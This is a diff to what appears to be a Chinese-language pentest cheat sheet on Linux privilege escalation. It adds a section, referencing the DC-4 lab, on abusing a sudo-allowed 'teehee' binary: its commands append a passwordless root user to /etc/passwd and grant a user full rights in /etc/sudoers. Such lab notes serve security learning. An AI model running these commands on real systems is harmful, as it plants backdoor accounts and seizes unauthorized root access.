@@ -77,6 +77,23 @@ sudo -l
 sudo git -p help config
 !/bin/sh
 ```
+
+#### teehee提权
+
+案例参考可见DC4
+
+```bash
+eehee --help
+1.直接写个 root 权限用户
+echo "test::0:0:::/bin/sh" | sudo teehee -a /etc/passwd
+cat /etc/passwd | grep '/bin/bash'
+su test
+whoami
+2.在 sudoers 里给 charles 所有权限
+echo "charles ALL=(ALL:ALL) ALL" | sudo teehee /etc/sudoers
+sudo -l
+sudo su
+```
 ## 参考文章
 
 * https://wiki.xazlsec.com/project-9/doc-730/
